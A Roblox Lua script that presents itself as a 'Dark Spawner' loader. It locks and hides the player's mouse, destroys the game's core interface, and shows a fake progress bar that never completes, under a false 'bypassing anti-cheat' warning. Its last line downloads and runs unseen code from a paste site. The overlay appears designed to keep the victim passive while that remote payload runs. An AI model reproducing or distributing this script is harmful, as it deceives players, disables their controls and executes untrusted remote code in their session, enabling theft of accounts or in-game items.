-- ⚙️ Khóa chuột và ẩn chuột
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

UserInputService.MouseIconEnabled = false
RunService:BindToRenderStep("ForceMouseCenter", Enum.RenderPriority.Last.Value + 1, function()
    if UserInputService.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    end
end)

-- 🔒 Xoá/ẩn GUI có sẵn
for _, v in pairs(playerGui:GetDescendants()) do
    if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and v.Visible then
        v.Visible = false
    end
end
for _, v in pairs(CoreGui:GetDescendants()) do
    pcall(function() v:Destroy() end)
end

-- 🌀 Loading Screen bắt đầu
local TweenService = game:GetService("TweenService")

local function createLoadingScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999999999
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = playerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    -- 🔺 Dòng "Dark Script" bên trên khung loading
local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0, 300, 0, 40)
titleText.Position = UDim2.new(0.5, -150, 0.5, -120)
titleText.BackgroundTransparency = 1
titleText.Text = "🌴Dark Script🌴"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextScaled = true
titleText.Font = Enum.Font.GothamBold
titleText.Parent = mainFrame

-- 🚨 Cảnh báo bypass anti-cheat
local warningText = Instance.new("TextLabel")
warningText.Size = UDim2.new(1, 0, 0, 30)
warningText.Position = UDim2.new(0, 0, 0, 0)
warningText.BackgroundTransparency = 1
warningText.Text = "PLEASE DO NOT LEAVE - BYPASSING ANTI-CHEAT"
warningText.TextColor3 = Color3.fromRGB(255, 0, 0)
warningText.TextScaled = true
warningText.Font = Enum.Font.GothamBold
warningText.Parent = mainFrame

    local loadingFrame = Instance.new("Frame")
    loadingFrame.Size = UDim2.new(0, 400, 0, 120)
    loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -60)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    loadingFrame.BorderSizePixel = 0
    loadingFrame.Parent = mainFrame

    Instance.new("UICorner", loadingFrame).CornerRadius = UDim.new(0, 12)

    local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, -40, 0, 30)
loadingText.Position = UDim2.new(0, 20, 0, 20)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading Dark Spawner"
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.TextScaled = false
loadingText.TextSize = 18
loadingText.Font = Enum.Font.GothamMedium
loadingText.Parent = loadingFrame

    local progressText = Instance.new("TextLabel")
    progressText.Size = UDim2.new(0, 60, 0, 25)
    progressText.Position = UDim2.new(1, -80, 0, 22)
    progressText.BackgroundTransparency = 1
    progressText.Text = "0%"
    progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
    progressText.TextScaled = true
    progressText.Font = Enum.Font.Gotham
    progressText.Parent = loadingFrame

    local progressBg = Instance.new("Frame")
    progressBg.Size = UDim2.new(1, -40, 0, 8)
    progressBg.Position = UDim2.new(0, 20, 0, 70)
    progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = loadingFrame

    Instance.new("UICorner", progressBg).CornerRadius = UDim.new(0, 4)

    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBg

    Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 4)

    local currentProgress = 0
    local targetProgress = 0
    local isStuck = false
    local isRunning = true

    local function updateProgress()
        if not isStuck and isRunning then
            if currentProgress < 90 then
                targetProgress = math.min(currentProgress + math.random(1, 4), 90)
            elseif currentProgress < 99 then
                targetProgress = math.min(currentProgress + math.random(1, 1), 99)
            else
                targetProgress = 99
                isStuck = true
            end
        end

        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(
            progressFill,
            tweenInfo,
            {Size = UDim2.new(targetProgress / 100, 0, 1, 0)}
        ):Play()

        if progressText then
            progressText.Text = math.floor(targetProgress) .. "%"
        end

        currentProgress = targetProgress
    end

    coroutine.wrap(function()
        local dotCount = 0
        while isRunning and screenGui.Parent do
            dotCount = (dotCount + 1) % 4
            loadingText.Text = "Loading Dark Spawner" .. string.rep(".", dotCount)
            wait(0.5)
        end
    end)()

    coroutine.wrap(function()
        wait(1)
        while currentProgress < 99 and isRunning and screenGui.Parent do
            updateProgress()
            wait(math.random(1, 3))
        end
        while isRunning and screenGui.Parent do
            wait(math.random(3, 8))
            if isStuck then
                progressText.Text = "100%"
                progressFill.Size = UDim2.new(1, 0, 1, 0)
                wait(0.1)
                progressText.Text = "99%"
                progressFill.Size = UDim2.new(0.99, 0, 1, 0)
            end
        end
    end)()

    screenGui.AncestryChanged:Connect(function()
        if not screenGui.Parent then
            isRunning = false
        end
    end)
end

createLoadingScreen()
loadstring(game:HttpGet("https://pastefy.app/P7rbqlQI/raw"))()
